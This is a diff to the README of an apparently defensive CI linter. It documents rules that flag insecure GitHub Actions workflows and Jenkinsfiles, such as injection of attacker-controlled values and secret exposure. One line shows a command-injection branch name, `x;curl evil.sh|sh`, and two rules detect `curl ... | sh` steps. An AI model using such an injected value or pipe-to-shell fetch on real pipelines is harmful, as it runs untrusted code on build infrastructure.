@@ -61,6 +61,39 @@ examples/bad/deploy.yaml
 
 `harness-doctor explain HD007` says why a rule exists. HD007 is the one most teams miss: Harness substitutes `<+codebase.branch>` into the script text before the shell parses it, so a branch named `x;curl evil.sh|sh` runs as code. Pass it through `envVariables` and read it quoted.
 
+### GitHub Actions workflows and Jenkinsfiles
+
+The same command checks `.github/workflows/*.yml` and any file named `Jenkinsfile*`, picking the rule set from the file itself. `harness-doctor check .github/workflows Jenkinsfile` runs both.
+
+| Rule | Severity | Catches |
+|------|----------|---------|
+| GA001 | warning | A third-party action pinned to a tag instead of a commit SHA (`actions/*` and `github/*` are skipped) |
+| GA002 | warning | A workflow with no `permissions` block, so the token gets the repository default |
+| GA003 | error | `${{ github.event.pull_request.title }}`, `github.head_ref` and similar attacker-controlled values written into a `run:` or `github-script` body |
+| GA004 | error | `pull_request_target` that checks out the pull request's head |
+| GA005 | error | `permissions: write-all` |
+| GA006 | warning | `${{ secrets.X }}` written into a script instead of passed through `env:` |
+| GA007 | warning | A self-hosted runner on a pull request trigger |
+| GA008 | info | A job with no `timeout-minutes` |
+| GA009 | warning | `curl ... \| sh` in a step |
+| JK001 | error | A password, token or key literal in the Jenkinsfile |
+| JK002 | warning | `agent any` |
+| JK003 | warning | A declarative pipeline with no `timeout` |
+| JK004 | warning | A double-quoted `sh` step that interpolates `params.*`, `env.BRANCH_NAME`, `CHANGE_TITLE` and similar |
+| JK005 | warning | A container image with no tag, `:latest`, or no digest |
+| JK006 | error | A stage that deploys to production with no `input` approval in or before it |
+| JK007 | warning | `curl ... \| sh` in a step |
+
+```
+examples/bad/workflow.yml
+     5  error    GA005  workflow grants write-all permissions
+    12  error    GA004  job 'build' checks out the PR head under pull_request_target
+    13  warning  GA001  'someorg/deploy-action@v2' is pinned to 'v2', not a commit SHA
+    14  error    GA003  ${{ github.event.pull_request.title }} is interpolated into a script
+```
+
+Jenkins checks read the Groovy text, not a parsed model, so they target declarative pipelines written in the usual style; a Jenkinsfile that builds its stages dynamically can hide a finding. Suppress one with `// harness-doctor: ignore JK002` above the line. `harness-doctor schema` validates Harness files only and skips the rest.
+
 ## Use it
 
 ```
